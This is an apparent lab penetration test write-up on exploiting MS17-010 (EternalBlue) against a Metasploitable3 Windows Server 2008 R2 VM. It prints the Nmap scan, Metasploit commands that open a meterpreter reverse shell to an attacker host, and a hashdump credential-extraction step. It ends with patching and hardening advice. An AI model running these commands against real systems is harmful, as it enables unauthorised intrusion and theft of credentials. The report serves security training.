# üõ°Ô∏è Windows Server Penetration Testing ‚Äì MS17-010 (EternalBlue)

A comprehensive penetration test targeting a Windows Server 2008 R2 system, revealing and exploiting the critical MS17-010 (EternalBlue) vulnerability. This project demonstrates real-world exploitation, post-exploitation, and remediation strategies‚Äîall performed within a controlled virtualized environment using two VMs: **metasploitable3_win** (target) and **Kali Linux** (attacker)[1][2][3][5].

---

## üöÄ Executive Summary

- **Target:** Windows Server 2008 R2 (`metasploitable3_win`, 192.168.37.135)
- **Attacker:** Kali Linux VM
- **Objective:** Identify and exploit security weaknesses in a lab setup
- **Environment:** All testing was conducted on virtual machines in the same isolated environment for safety and repeatability[2][3][5]
- **Result:** Gained full system control via MS17-010 (EternalBlue)  
- **Impact:** Demonstrated risk of network-wide compromise

## üñ•Ô∏è Lab Environment Details

| VM Name               | OS / Role              | Purpose             |
|-----------------------|------------------------|---------------------|
| metasploitable3_win   | Windows Server 2008 R2 | Vulnerable Target   |
| Kali Linux            | Kali Linux             | Attacker Platform   |

- Both VMs were configured on the same virtual network, ensuring safe, repeatable, and isolated testing[2][3][5].

## üîç Methodology

1. **Reconnaissance & Scanning**
   - Identified open SMB port (445) and vulnerability using Nmap:
     ```
     nmap --script smb-vuln-ms17-010 -p 445 192.168.37.135
     ```
     ```
     PORT    STATE SERVICE
     445/tcp open  microsoft-ds
     | smb-vuln-ms17-010: 
     |   VULNERABLE:
     |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
     |     State: VULNERABLE
     |     IDs:  CVE:CVE-2017-0143
     |     Risk factor: HIGH
     ```
   - The scan confirmed the target was running on VMware, ensuring the test was isolated and safe[2].

2. **Exploitation**
   - Used Metasploit's EternalBlue module from the Kali Linux VM:
     ```
     use exploit/windows/smb/ms17_010_eternalblue
     set RHOSTS 192.168.37.135
     set PAYLOAD windows/meterpreter/reverse_tcp
     set LHOST <attacker_ip>
     exploit
     ```
   - Achieved SYSTEM shell:
     ```
     meterpreter > shell
     Microsoft Windows [Version 6.1.7601]
     ```

3. **Post-Exploitation**
   - **System Enumeration:**
     ```
     systeminfo
     ```
     - OS: Windows Server 2008 R2 Standard (VMware Virtual Platform)[2]
     - Host Name: VAGRANT-2008R2
     - Domain: WORKGROUP

   - **Credential Dumping:**
     ```
     hashdump
     ```
     - Extracted password hashes for multiple users, including Administrator[2].

## üìä Key Findings

- **Critical Vulnerability:** MS17-010 allowed unauthenticated remote code execution
- **Full Compromise:** SYSTEM-level access and credential extraction
- **Lateral Movement Potential:** Risk of network-wide breach

---

## üõ°Ô∏è Remediation Recommendations

- **Immediate:**
  - Apply patch KB4012212 to fix MS17-010
  - Disable SMBv1
- **Long-term:**
  - Enforce strong password policies
  - Implement network segmentation
  - Monitor SMB activity
